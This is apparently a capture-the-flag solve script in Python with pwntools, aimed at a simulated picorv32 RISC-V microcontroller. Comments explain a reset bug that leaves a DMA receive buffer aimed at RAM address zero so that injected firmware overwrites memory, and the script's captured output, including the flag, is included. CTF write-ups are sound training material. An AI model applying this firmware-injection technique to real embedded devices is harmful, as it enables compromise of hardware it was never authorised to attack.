# Program execution:
# - modified verilator simulator that runs a picorv32 RISC core with added modules for UART, AXI, and a custom rx/tx module LPT (parallel port)
# - kernel initially prints data using UART, then enables and prints data using AXI DMA
# - input received is constrained to 1024 bytes (256 4-byte aligned blocks)
# - user can try guessing the flag up to 3 times before machine resets
# - reset is done by a custom verilator function which sets resetn wire low for 10 clock cycles and high for 10 clock cycles

# Vulnerability:
# - kernel sets the address of REG32(LPT_REG_RX_BUFFER_START) after letting UART print to screen for 20000 cycles
# - on first iteration LPT is not enabled and so there is no exploit
# - if user fails check_flag and machine resets, REG32(LPT_REG_RX_BUFFER_START) is set to 0 but LPT is not disabled
# - on 2nd iteration, data written is received by LPT and written to 0x0 for first 20000 cycles
# - RAM is located from 0x0 to 0x1000 so writing a new firmware that prints flag during this window will execute
# - can compile firmware and read w/ objdump, then use instruction as point of reference to find print statement to overwrite w/ flag address

# Exploit:
# Exploit ended up being to corrupt result of strlen in fast_puts by accident due to an unalignment between server RAM and provided RAM file. 2 byte unalignment causes strlen in fast_puts to return its arg (a large number), causing kernel to dump all strings in memory.
# Could also write to start of memory before unalignment to dump all memory (REG32(LPT_REG_TX_BUFFER_END) = 0x10000; while(1);)

# Resources:
# https://docs.google.com/viewer?url=https%3A%2F%2Fwww.cl.cam.ac.uk%2Fteaching%2F1617%2FECAD%2BArch%2Ffiles%2Fdocs%2FRISCVGreenCardv8-20151013.pdf&pdf=true
# https://docs.google.com/viewer?url=https%3A%2F%2Fraw.githubusercontent.com%2Fjameslzhu%2Friscv-card%2Fcc7636f39ca3e7298b209a91fd9978eef83df44b%2Friscv-card.pdf&pdf=true
# https://github.com/cliffordwolf/picorv32

from pwn import *

data = open("firmware.hex", "rb").read()
data = data.replace(b'\n',b'')
firmware = b''
for i in range(0,len(data), 8):
    firmware += struct.pack("<I", int(data[i:i+8],16))
write("firmware.x", data=firmware)

# r = process('./Vtop')
r = remote("ford-cpu.chujowyc.tf", 4001)
r.interactive()

r.send(b"ack\n\n\n\n\n")
print(r.recv())
r.send("cmp\n\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
firmware = firmware[:0x248]
r.send(firmware)

r.interactive()

# chCTF{Pr0P3R_r353771n9_15_V3rY_H4RD}


# b"Booting the HardHardFlag MCU :D\nThis MCU is running a picorv32 core which I've got from github\nIt must be 100 percent secure.\nI added some peripherals to it via the AXI4 bus xD\nI hated the slow transfer rates of UART.\nSo I've added a parallel port with DMA to it to make it faster xD\nTERMINATING SLOW UART - TIME FOR 1337 DMA xD\nNow as I'm using DMA my messages should appear instantly.\n\x00\x00TEEEEEEEEEEEEEEEEEEEEEEEEEEST\n\x00\x00Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.\n\x00Now as you can see the output appears really fast on the screen\nxD xD XD Can you PWN my DMA controller? xD xD XD\n"
# b'\x00\x00\x00'
# b''
# b''
# b''
# [*] Switching to interactive mode
# OK
# \x00resetting...
# Booting the HardHardFlag MCU :D
# This MCU is running a picorv32 core which I've got from github
# It must be 100 percent secure.
# I added some peripherals to it via the AXI4 bus xD
# I hated the slow transfer rates of UART.
# So I've added a parallel port with DMA to it to make it faster xD
# TERMINATING SLOW UART - TIME FOR 1337 DMA xD
# Now as I'm using DMA my messages should appear instantly.
# \x00TEEEEEEEEEEEEEEEEEEEEEEEEEEST
# \x00Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
# \x00ow as you can see the output appears really fast on the screen
# \x00\x00xD xD XD Can you PWN my DMA controller? xD xD XD
# \x00\x00ommand too long
# \x00\x00nf
# \x00\x00This leet mcu is powered by the new RISCV architecture :D
# \x00eula\x00\x00[END USER LICENCE AGREEMENT] INSERT SOME LONG TEXT HERE
# If you accept the EULA then send ack
# \x00\x00ck
# \x00\x00OK
# \x00mp
# \x00\x00You must accept the EULA
# \x00\x00ow you have 3 tries to guess the flag
# \x00nvalid command
# \x00\x00chCTF{Pr0P3R_r353771n9_15_V3rY_H4RD}\x00\x00INVALID FLAG
# \x00\x00RR: IRQ %d undhandled!
# \x00\x00.\x11\x00
